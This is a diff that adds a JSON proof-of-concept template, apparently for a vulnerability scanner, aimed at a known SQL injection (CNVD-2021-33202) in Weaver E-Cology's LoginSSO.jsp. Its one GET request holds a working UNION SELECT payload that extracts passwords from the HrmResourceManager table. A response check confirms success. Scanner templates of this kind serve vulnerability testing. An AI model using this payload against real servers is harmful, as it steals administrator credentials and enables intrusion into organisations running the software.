@@ -1,0 +1,19 @@
+{
+  "poc": "泛微-E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": ""
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["<code>"]
+      }
+    }
+  ]
+}
